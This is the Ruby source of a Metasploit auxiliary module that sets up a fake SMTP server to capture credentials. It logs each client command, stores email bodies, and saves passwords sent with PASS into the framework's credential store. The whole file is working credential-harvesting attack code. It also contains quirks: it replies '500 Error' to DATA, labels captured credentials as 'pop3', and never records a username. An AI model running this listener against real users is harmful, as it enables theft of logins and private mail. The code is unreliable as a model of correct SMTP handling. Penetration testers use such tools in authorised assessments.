##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report


  def initialize
    super(
      'Name'        => 'Authentication Capture: SMTP',
      'Description'    => %q{
        This module provides a fake SMTP service that
      is designed to capture authentication credentials.
      },
      'Author'      => ['ddz', 'hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 25 ])
      ])
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "220 SMTP Server Ready\r\n"
  end

  def on_client_data(c)
    data = c.get_once
    return if not data

    print_status("SMTP: #{@state[c][:name]} Command: #{data.strip}")

    if(@state[c][:data_mode])

      @state[c][:data_buff] ||= ''
      @state[c][:data_buff] += data

      idx = @state[c][:data_buff].index("\r\n.\r\n")
      if(idx)
        report_note(
          :host => @state[c][:ip],
          :type => "smtp_message",
          :data => @state[c][:data_buff][0,idx]
        )
        @state[c][:data_buff][0,idx].split("\n").each do |line|
          print_status("SMTP: #{@state[c][:name]} EMAIL: #{line.strip}")
        end

        @state[c][:data_buff] = nil
        @state[c][:data_mode] = nil
        c.put "250 OK\r\n"
      end

      return
    end


    cmd,arg = data.strip.split(/\s+/, 2)
    arg ||= ""

    case cmd.upcase
    when 'HELO', 'EHLO'
      c.put "250 OK\r\n"
      return

    when 'MAIL'
      x,from = data.strip.split(":", 2)
      @state[c][:from] = from.strip
      c.put "250 OK\r\n"
      return

    when 'RCPT'
      x,targ = data.strip.split(":", 2)
      @state[c][:rcpt] = targ.strip
      c.put "250 OK\r\n"
      return

    when 'DATA'
      @state[c][:data_mode] = true
      c.put "500 Error\r\n"
      return

    when 'QUIT'
      c.put "221 OK\r\n"
      return

    when 'PASS'

      @state[c][:pass] = arg

      report_cred(
        ip: @state[c][:ip],
        port: datastore['SRVPORT'],
        service_name: 'pop3',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: arg
      )
      print_good("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
    end

    c.put "503 Server Error\r\n"
    return

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_close(c)
    @state.delete(c)
  end


end
